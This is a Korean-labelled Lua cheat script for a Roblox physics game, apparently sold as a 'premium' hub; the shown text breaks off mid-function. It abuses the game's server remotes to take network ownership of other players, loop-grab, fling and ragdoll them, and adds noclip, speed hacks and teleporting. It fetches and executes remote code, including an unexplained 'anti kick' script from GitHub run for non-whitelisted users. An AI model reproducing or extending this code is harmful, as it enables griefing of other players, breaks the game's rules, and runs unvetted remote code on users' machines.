


print("AP FTAP Script 시작 - 설정 저장 활성화")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

Players = game:GetService("Players")
plr = game.Players.LocalPlayer
cam = workspace.CurrentCamera
mouse = plr:GetMouse()
uis = game:GetService("UserInputService")
inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
rs = game:GetService("ReplicatedStorage")
RepStorage = game:GetService("ReplicatedStorage")
rs2 = game:GetService("RunService")
deb = game:GetService("Debris")

SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
DestroyGrabLine = rs.GrabEvents.DestroyGrabLine

Auto = syn and syn.queue_on_teleport or fluxus and fluxus.queue_on_teleport or queue_on_teleport

Whitelist = {}
playersInLoop1V = {} -- List
playersInLoop2V = {} -- Loop

PPs = workspace:WaitForChild("PlotItems"):WaitForChild("PlayersInPlots")

----------------------------------------------------------------------------------------- [ 기본 설정 ]
function PcldOwner()
    task.spawn(function()
        while task.wait(0.1) do
            usedNames = {}

            for _, pcld in pairs(workspace:GetChildren()) do
                if pcld.Name == "PlayerCharacterLocationDetector" then
                    if pcld.CFrame == CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1) then
                        continue
                    end

                    hasOwner = false
                    existingBoolValues = {}

                    for _, child in pairs(pcld:GetChildren()) do
                        if child:IsA("BoolValue") then
                            table.insert(existingBoolValues, child)
                        end
                    end

                    if #existingBoolValues >= 2 then
                        for _, boolValue in pairs(existingBoolValues) do
                            boolValue:Destroy()
                        end
                    elseif #existingBoolValues == 1 then
                        hasOwner = true
                    end

                    if hasOwner then
                        continue
                    end

                    closestPlayer = nil
                    closestDist = 30
                    candidates = {}

                    for _, player in pairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp = player.Character.HumanoidRootPart
                            dist = (pcld.Position - hrp.Position).Magnitude

                            if dist < closestDist then
                                table.insert(candidates, {
                                    player = player,
                                    dist = dist,
                                    hrp = hrp
                                })
                            end
                        end
                    end

                    table.sort(candidates, function(a, b)
                        return a.dist < b.dist
                    end)

                    for _, candidate in pairs(candidates) do
                        ownerName = string.format("[ %s ] ( @%s )",
                            candidate.player.DisplayName,
                            candidate.player.Name)

                        if not usedNames[ownerName] then
                            closestPlayer = candidate.player
                            closestDist = candidate.dist
                            usedNames[ownerName] = true
                            break
                        end
                    end

                    if closestPlayer then
                        ownerName = string.format("[ %s ] ( @%s )",
                            closestPlayer.DisplayName,
                            closestPlayer.Name)

                         boolValue = nil
                        for _, child in pairs(pcld:GetChildren()) do
                            if child:IsA("BoolValue") then
                                boolValue = child
                                boolValue.Name = ownerName
                                break
                            end
                        end

                        if not boolValue then
                            boolValue = Instance.new("BoolValue")
                            boolValue.Name = ownerName
                            boolValue.Parent = pcld
                        end

                        task.spawn(function(player, value)
                            while value.Parent do
                                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                     hrp = player.Character.HumanoidRootPart
                                    
                                    if hrp.Massless == true then
                                        if not value.Value then
                                            value.Value = true
                                        end
                                    else
                                        if value.Value then
                                            value.Value = false
                                        end
                                    end

                                    if not Players:FindFirstChild(player.Name) or 
                                       not player.Character or 
                                       player.Character:FindFirstChild("Humanoid") and 
                                       player.Character.Humanoid.Health <= 0 then
                                        value:Destroy()
                                        break
                                    end
                                else
                                    value:Destroy()
                                    break
                                end

                                task.wait(0.1)
                            end
                        end, closestPlayer, boolValue)
                    end
                end
            end
        end
    end)
end


function SpawnCFrame()
    local camPart
    myDisplayName = plr.DisplayName
    myUserName = plr.Name
    myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)

    function findMyPO()
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" then
                for _, child in pairs(obj:GetChildren()) do
                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
                        return obj
                    end
                end
            end
        end
        return nil
    end

    if not workspace:FindFirstChild("CamPart") or workspace:FindFirstChild("CamPart"):FindFirstChild("CamPart") then
         char = plr.Character or plr.CharacterAdded:Wait()
        camPart = char:FindFirstChild("CamPart"):Clone()
        camPart.Name = "CamPart"
        camPart.Parent = workspace
        camPart.Transparency = 0.9
    else
        camPart = workspace.CamPart
    end

     lastHRPVelocity = Vector3.new(0, 0, 0)

    task.spawn(function()
         rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude

        while true do
             ping = plr:GetNetworkPing()
             myPO = findMyPO()
             char = plr.Character
             hrp = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then
                lastHRPVelocity = hrp.Velocity
            end

            if myPO and hrp then
                rayParams.FilterDescendantsInstances = {char, camPart, myPO}

                 offset = myPO.Position + (lastHRPVelocity * (ping + 0.15))

                 rayOrigin = offset
                 rayDirection = Vector3.new(0, 23, 0)
                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                 originalRotation = myPO.CFrame.Rotation * CFrame.Angles(math.rad(-90), 0, 0)
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation

                rayParams.FilterDescendantsInstances = {char, camPart}

                 offset = hrp.Position + (lastHRPVelocity * (ping + 0.15))
                
                 rayOrigin = offset
                 rayDirection = Vector3.new(0, 20, 0)
                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                 originalRotation = (hrp.CFrame * CFrame.Angles(math.rad(-90), 0, 0)).Rotation
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation
                camPart.Name = "SpawnCF"
            end
            task.wait()
        end
    end)

    return camPart
end

G = rs.GrabEvents
G:WaitForChild("EndGrabEarly"):Destroy()
Instance.new("RemoteEvent", G).Name = "EndGrabEarly"

 local Rayfield =   loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local paca = {
    TextColor = Color3.fromRGB(255,255,255),
    LabelColor = Color3.fromRGB(0,220,100),

    Background = Color3.fromRGB(0,0,0),
    Topbar = Color3.fromRGB(8,8,8),
    Shadow = Color3.fromRGB(0,0,0),

    NotificationBackground = Color3.fromRGB(12,12,12),
    NotificationActionsBackground = Color3.fromRGB(25,25,25),

    TabBackground = Color3.fromRGB(15,10,22),
    TabStroke = Color3.fromRGB(45,25,70),
    TabBackgroundSelected = Color3.fromRGB(110,40,190),
    TabTextColor = Color3.fromRGB(150,150,150),
    SelectedTabTextColor = Color3.fromRGB(255,255,255),

    ElementBackground = Color3.fromRGB(10,10,10),
    ElementBackgroundHover = Color3.fromRGB(18,18,18),
    SecondaryElementBackground = Color3.fromRGB(5,5,5),
    ElementStroke = Color3.fromRGB(25,25,25),
    SecondaryElementStroke = Color3.fromRGB(18,18,18),

    SliderBackground = Color3.fromRGB(30,30,30),
    SliderProgress = Color3.fromRGB(255,255,255),
    SliderStroke = Color3.fromRGB(180,180,180),

    ToggleBackground = Color3.fromRGB(12,12,12),

    ToggleEnabled = Color3.fromRGB(220,0,0),
    ToggleEnabledStroke = Color3.fromRGB(255,80,80),
    ToggleEnabledOuterStroke = Color3.fromRGB(150,0,0),

    ToggleDisabled = Color3.fromRGB(40,40,40),
    ToggleDisabledStroke = Color3.fromRGB(60,60,60),
    ToggleDisabledOuterStroke = Color3.fromRGB(25,25,25),

    DropdownSelected = Color3.fromRGB(20,15,25),
    DropdownUnselected = Color3.fromRGB(12,12,12),

    InputBackground = Color3.fromRGB(15,15,8),
    InputStroke = Color3.fromRGB(220,180,0),
    PlaceholderColor = Color3.fromRGB(120,110,80),
}

local oldCreateToggle = Rayfield.CreateToggle
local oldCreateButton = Rayfield.CreateButton
local oldCreateLabel = Rayfield.CreateLabel
local oldCreateDropdown = Rayfield.CreateDropdown
local oldCreateSlider = Rayfield.CreateSlider
local oldCreateInput = Rayfield.CreateInput

-- 텍스트 내부에서 특정 단어를 찾아 그라데이션으로 쪼개주는 내부 함수
local function autoGradient(text, target, startColor, endColor)
    if not string.find(text, target, 1, true) then return text end
    
    local len = utf8.len(target)
    local result = ""
    local count = 0
    
    for _, code in utf8.codes(target) do
        local char = utf8.char(code)
        count = count + 1
        local ratio = (len > 1) and ((count - 1) / (len - 1)) or 0
        local r = math.floor(startColor.R * 255 + (endColor.R - startColor.R) * 255 * ratio)
        local g = math.floor(startColor.G * 255 + (endColor.G - startColor.G) * 255 * ratio)
        local b = math.floor(startColor.B * 255 + (endColor.B - startColor.B) * 255 * ratio)
        result = result .. string.format("<font color='rgb(%d,%d,%d)'>%s</font>", r, g, b, char)
    end
    
    return string.gsub(text, string.gsub(target, "([%(%)%.%%%+%-%*%?%[%]%^%$])", "%%%1"), result)
end

local function applyRichTextAndEffects(element)
    if not element then return end
    task.spawn(function()
        for _, v in pairs(element:GetDescendants()) do
            if v:IsA("TextLabel") then
                local currentText = v.Text
                
                -- 이미 작성되어 있던 특정 문구들을 자동으로 그라데이션 텍스트로 변환
                -- 예: [라인]을 주황->노랑 그라데이션으로 변경
                currentText = autoGradient(currentText, "[라인]", Color3.fromRGB(255, 100, 0), Color3.fromRGB(255, 255, 0))
                -- 예: [프리미엄]을 빨강->파랑 그라데이션으로 변경
                currentText = autoGradient(currentText, "[프리미엄]", Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255))
                
                v.Text = currentText
                v.RichText = true
                
                -- 글자 뒤에 은은하게 깔리는 검은색 안개(번짐) 효과
                v.TextStrokeTextColor3 = Color3.fromRGB(0, 0, 0)
                v.TextStrokeThickness = 2.5
                v.TextStrokeTransparency = 0.5
            end
        end
    end)
end

function Rayfield:CreateToggle(options)
    local element = oldCreateToggle(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateButton(options)
    local element = oldCreateButton(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateLabel(options)
    local element = oldCreateLabel(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateDropdown(options)
    local element = oldCreateDropdown(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateSlider(options)
    local element = oldCreateSlider(self, options)
    applyRichTextAndEffects(element)
    return element
end

function Rayfield:CreateInput(options)
    local element = oldCreateInput(self, options)
    applyRichTextAndEffects(element)
    return element
end


local Window = Rayfield:CreateWindow({
    Name = "파카허브 [프리미엄]",
    Icon = 0,
    Theme = paca,
    ToggleUIKeybind = "T",

    ConfigurationSaving = {
        Enabled = true,
        FolderName = "PacaHub",
        FileName = "Premium"
    }
})
local playerTab = Window:CreateTab("플레이어 설정", 6034281935)    
local passTab = Window:CreateTab("패스잠금해제")
local getTab = Window:CreateTab("알림",649498361)
local grabTab = Window:CreateTab("컴뱃", 6026568198)               
local UtilityTab = Window:CreateTab("유틸리티", 6031094678) 
local plotTab = Window:CreateTab("집")
local DDTab = Window:CreateTab("티배깅")
local antiTab = Window:CreateTab("안전", 6034831332)               
local ListTab = Window:CreateTab("명단", 3572491301)              
local LoopTab = Window:CreateTab("조지기", 6023426923)             
local AuraTab = Window:CreateTab("아우라", 6031068423)   
local funTab = Window:CreateTab("찌끄레기", 4483345998)            
local keybindTab = Window:CreateTab("설정", 6031094678)            
local DevTab = Window:CreateTab("잡기능", 3944680095)             
local RankTab = Window:CreateTab("제작자 친구", 6034281935)       
local CreditsTab = Window:CreateTab("제작자 한정")


----------------------------------------------------------------------------------------- [ 기능들 ]

function ForWhiteList(enable)
    WhiteListMode = enable

    task.spawn(function()
        while WhiteListMode do
            task.wait()
            for i, name in ipairs(Whitelist) do
            end
        end
    end)
end

function House()
    char = plr.Character
    if not char then
        Plot = nil
        return
    end

    if char.Parent and char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
        return
    end

    if char.Parent == workspace or char.Parent == inv then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
    else
        Plot = nil
    end
end

function UpdateCurrentBlobman()
	char = plr.Character
	hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	for _, blobs in workspace:GetDescendants() do
		if blobs.Name ~= "CreatureBlobman" then continue end
		 seat = blobs:FindFirstChild("VehicleSeat")
		if not seat then continue end
		 weld = seat:FindFirstChild("SeatWeld")
		if not weld then continue end
		if weld.Part1 == hrp then
			currentBlobS = blobs
		end
	end
end

function BlobRelease(blob, target, side) -- 릴리스
     args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(unpack(args))
end

function BlobGrab(blob, target, side)
     args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function BlobDrop(blob, target, side)
     args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args))
end

function BlobMassless(blob, target, side)
     args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }

		 args2 = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = hrp,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }

     args3 = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }

        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args2))
		blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
end

function GfLogger()
    id = {
        [1] = true,
    }
if not id[plr.UserId] then
        local success, errorMessage = pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))()
        end)

        if not success then
        end
    end
end
function flingF()
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "GrabParts" then
             part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
            if part_to_impulse then
                model:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not model.Parent and flingT then
                        local connection
                        connection = uis.InputBegan:Connect(function(inp, char)
                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                                 velocityObj = Instance.new("BodyVelocity")
                                velocityObj.Parent = part_to_impulse
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
                                
                                wait(0.1)
                                velocityObj.Parent = workspace
                                velocityObj:Destroy()

                                connection:Disconnect()
                            end
                        end)
                    end
                end)
            end
        end
    end)
end

function infLineExtendF()
    uis.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
    
            if input.Position.Z > 0 then
                lineDistanceV = lineDistanceV + increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV = lineDistanceV - increaseLineExtendV
            end
        end
    end)
    
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" and child:IsA("Model") then
            if infLineExtendT and uis.MouseEnabled then
                 grabPartsModel = child

                grabPartsModel:WaitForChild("GrabPart")
                grabPartsModel:WaitForChild("DragPart")
                    
                 clonedDragPart = grabPartsModel.DragPart:Clone()
                clonedDragPart.Name = "DragPart1"
                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
                clonedDragPart.Parent = grabPartsModel
                
                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
    
                clonedDragPart.AlignOrientation.Enabled = false
                grabPartsModel.DragPart.AlignPosition.Enabled = false

                if MasslessGrabT then
                     alignOrientation = clonedDragPart:FindFirstChildOfClass("AlignOrientation")
                    if alignOrientation then
                        alignOrientation.MaxAngularVelocity = math.huge
                        alignOrientation.MaxTorque = math.huge
                        alignOrientation.Responsiveness = 200
                    end
                    
                     alignPosition = clonedDragPart:FindFirstChildOfClass("AlignPosition")
                    if alignPosition then
                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                        alignPosition.MaxForce = math.huge
                        alignPosition.MaxVelocity = math.huge
                        alignPosition.Responsiveness = 200
                    end
                end
    
                task.spawn(function()
                    while grabPartsModel.Parent do
                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
                        task.wait()
                    end
            
                    lineDistanceV = 0
                end)
            end
        end
    end)
end

function BlobMasslessR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		BlobMassless(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobReleaseR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
		BlobRelease(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobGrabR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobDropR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
         player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			BlobDrop(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end


function updateWalkSpeedF()
     function apply(char)
         hum = char:WaitForChild("Humanoid")

        if walkSpeedT then
            hum.WalkSpeed = walkSpeedV
            hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if walkSpeedT then
                    hum.WalkSpeed = walkSpeedV
                end
            end)
        else
            hum.WalkSpeed = 16
        end
    end

    if plr.Character then
        apply(plr.Character)
    end

    plr.CharacterAdded:Connect(apply)
end

function updateJumpPowerF()
     function apply(char)
         hum = char:WaitForChild("Humanoid")

        if jumpPowerT then
            hum.JumpPower = jumpPowerV
            hum:GetPropertyChangedSignal("JumpPower"):Connect(function()
                if jumpPowerT then
                    hum.JumpPower = jumpPowerV
                end
            end)
        else
            hum.JumpPower = 26
        end
    end

    if plr.Character then
        apply(plr.Character)
    end

    plr.CharacterAdded:Connect(apply)
end

 RunService = game:GetService("RunService")

 NO_CLIP_PARTS = {
    "Head",
    "Torso",
    "Left Arm", 
    "Left Leg",
    "Right Arm",
    "Right Leg"
}

function updateNoClipF()
     char = plr.Character
    if not char then return end

    if noClipConnection then
        noClipConnection:Disconnect()
        noClipConnection = nil
    end

    if not noClipT then
        restoreCollision(char)
        return
    end
    
     hrp = char:WaitForChild("HumanoidRootPart")
     hum = char:WaitForChild("Humanoid")

    noClipConnection = RunService.Stepped:Connect(function()
        if not noClipT or not char or not char.Parent then
            if noClipConnection then
                noClipConnection:Disconnect()
                noClipConnection = nil
            end
            return
        end

        for _, partName in ipairs(NO_CLIP_PARTS) do
             part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end)
end

function restoreCollision(char)
    if char then
        for _, partName in ipairs(NO_CLIP_PARTS) do
             part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

plr.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.5)
    
    if noClipT then
        updateNoClipF()
    end
end)

if plr.Character then
    task.wait(1)
    if noClipT then
        updateNoClipF()
    end
end



function masslessF()
    function applyMassless(char)
         hrp = char:WaitForChild("HumanoidRootPart")
         hum = char:WaitForChild("Humanoid")

        if masslessT then
            task.spawn(function()
                while masslessT and char.Parent do
                    for i, e in ipairs(char:GetChildren()) do
                        if e:IsA("BasePart") then
                            e.Massless = false
                        end
                    end
                    task.wait()
                end
            end)
        end
    end

    if plr.Character then
        applyMassless(plr.Character)
    end

    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        applyMassless(char)
    end)
end

function setRagdollF(state)
    char = plr.Character
    hrp = char:WaitForChild("HumanoidRootPart")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs.CharacterEvents.RagdollRemote:FireServer(hrp, state and 1 or 0)
    end
end

function permRagdollLoopF()
    if permRagdollRunningS then return end
    permRagdollRunningS = true
    while permRagdollT do
        setRagdollF(true)
        task.wait(0.001) 
    end
    permRagdollRunningS = false
    setRagdollF(false)
end


Pline = rs.GrabEvents.CreateGrabLine.OnClientEvent
fireCount = {}
function AntiLagF()
    Pline:Connect(function(fromPlr, ...)
        if not antiLagEnabled then return end
        if typeof(fromPlr) ~= "Instance" or not fromPlr:IsA("Player") then return end
        if fromPlr == plr then return end

        local now = os.clock()

        if not fireCount[fromPlr] then 
            fireCount[fromPlr] = {count = 0, start = now} 
        end

        local data = fireCount[fromPlr]

        if now - data.start > 1 then
            data.count = 0
            data.start = now
        end

        data.count += 1

        if data.count >= AntiLagV and not data.isDecreasing then
            data.isDecreasing = true
            Rayfield:Notify({Title = "[ ✏️ ]", Content = "by: " .. fromPlr.Name, Duration = 3, Image = 0})
            plr.PlayerScripts.CharacterAndBeamMove.Enabled = false

            task.spawn(function()
                while data.count > 0 do
                    task.wait(0.1)
                    data.count -= 1
                end

                plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
                fireCount[fromPlr] = nil
            end)
        end
    end)
end


function spawnBlobmanF()
     char = plr.Character
     hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end

     blob = inv and inv:FindFirstChild("CreatureBlobman")
    if blob then
        blobmanInstanceS = blob
        return
    end

     spawnRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
    if spawnRemote then
        task.spawn(function()
        pcall(function()
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.new(0, 0, 0))
        end)
        end)

         tries = 0
        repeat
            task.wait(0.02)
            blobmanInstanceS = inv and inv:FindFirstChild("CreatureBlobman")
            tries += 1
        until blobmanInstanceS or tries > 25
    else
    end
end

function ragdollLoopF()
	if ragdollLoopD then return end
	ragdollLoopD = true

	while sitJumpT do
		char = plr.Character
		hrp = char and char:FindFirstChild("HumanoidRootPart")
		if char and hrp then
			 args = {[1] = hrp, [2] = 0}
			 remote = rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
			if remote then
				remote:FireServer(unpack(args))
			end
		end
		task.wait()
	end

	ragdollLoopD = false
end



function BlobSit()
    if BLOBSIT then return end

     char = plr.Character
    if not char then return end

     humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if humanoid.SeatPart ~= nil then return end

    BLOBSIT = true

    myInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
    myBlob = myInv and myInv:FindFirstChild("CreatureBlobman")

    if myBlob then
         seat = myBlob:FindFirstChildOfClass("VehicleSeat")
        if seat then
            if seat.Occupant == nil then
                seat:Sit(humanoid)
                BLOBSIT = false
                return
            else
                 targetPlr = game.Players:GetPlayerFromCharacter(seat.Occupant.Parent)
                if targetPlr then
                    TP(targetPlr)
                    task.wait(0.3)
                    SetOwner(targetPlr)
                    task.wait(0.05)
                    seat:Sit(humanoid)
                    BLOBSIT = false
                    return
                end
            end
        end
    end

local function toggleTPUI(state)
    tpEnabled = state
    if state then
        tpGui = Instance.new("ScreenGui")
        tpGui.Name = "AlpacaMobileTPSystem"
        tpGui.Parent = game.CoreGui -- Delta/Xeno/ 등 실행기가 CoreGui 권한을 가짐
        
       
        local tpBtn = Instance.new("TextButton")
        tpBtn.Name = "ElegantMobileTPButton"
        tpBtn.Parent = tpGui
        
        
        tpBtn.Position = UDim2.new(1, -127, 1, -127) 
        tpBtn.Size = UDim2.new(0, 60, 0, 60) 
        
       
        tpBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20) 
        tpBtn.BackgroundTransparency = 0.4
        tpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        tpBtn.Text = "TP"
        tpBtn.Font = Enum.Font.SourceSansBold
        tpBtn.TextSize = 17
        tpBtn.BorderSizePixel = 0
        
        local uiCornerBtn = Instance.new("UICorner")
        uiCornerBtn.CornerRadius = UDim.new(1, 0) 
        uiCornerBtn.Parent = tpBtn
        
        
        local uiStroke = Instance.new("UIStroke")
        uiStroke.Color = Color3.fromRGB(0, 217, 255) 
        uiStroke.Thickness = 2.5
        uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        uiStroke.Parent = tpBtn

        
        tpBtn.MouseButton1Click:Connect(performTeleport)
    else
        if tpGui then tpGui:Destroy() tpGui = nil end
    end
end


    task.spawn(function()
        rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"):InvokeServer(
            "CreatureBlobman", 
            CFrame.new(0,9999999,0), 
            Vector3.new(0,9999999,0)
        )
    end)

    task.delay(0.1, function()
         newInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
         newBlob = newInv and newInv:FindFirstChild("CreatureBlobman")
        if newBlob then
             seat = newBlob:FindFirstChildOfClass("VehicleSeat")
            if seat and seat.Occupant == nil and humanoid then
                seat:Sit(humanoid)
            end
        end
        BLOBSIT = false
    end)
end

local function getClosestPlayer(targetPart)
    local closest, distance = nil, math.huge
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local mag = (targetPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if mag < distance then
                distance = mag
                closest = player
            end
        end
    end
    return closest
end


function SetOwner(target)
	local head = target.Character:FindFirstChild("HumanoidRootPart")
	if head and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
		return true
	end
	return false
end

function UnOwner(target)
	local head = target.Character:FindFirstChild("HumanoidRootPart")
	if head and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
		return true
	end
	return false
end

function BACK(originCF)
	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		plr.Character.HumanoidRootPart.CFrame = originCF
	end
end

local function safeGetCharacterParts(player)
    if not player then return nil end
    local char = player.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local head = char:FindFirstChild("Head")
    return char, hrp, head
end

function loopPlayerBlobF() -- 블롭 룹1
    UpdateCurrentBlobman()

    local seat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        return false
    end

    local isRiding = seat and seat.Parent and seat.Parent.Name == "CreatureBlobman"

    local processedHumanoids = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        if hrp.Massless == true and not isRiding then
            return false
        end

        local myChar = plr and plr.Character
        local myHrp = myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while blobLoopT do
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)

            local ownerTag = head:FindFirstChild("PartOwner")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        local targetNames = { "NinjaKunai", "NinjaShuriken", "NinjaKatana", "ToolCleaver", "ToolDiggingForkRusty", "ToolPencil", "ToolPickaxe" }
        for _, child in ipairs(workspace:GetChildren()) do
            if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                for _, item in ipairs(child:GetChildren()) do
                    if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                        local sticky = item.StickyPart
                        local weld = sticky:FindFirstChild("StickyWeld")
                        if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                            local targetParts = {
                                character:FindFirstChild("Head"),
                                character:FindFirstChild("Torso"),
                                character:FindFirstChild("Left Arm"),
                                character:FindFirstChild("Left Leg"),
                                character:FindFirstChild("Right Arm"),
                                character:FindFirstChild("Right Leg"),
                                hrp:FindFirstChild("RagdollTouchedHitbox"),
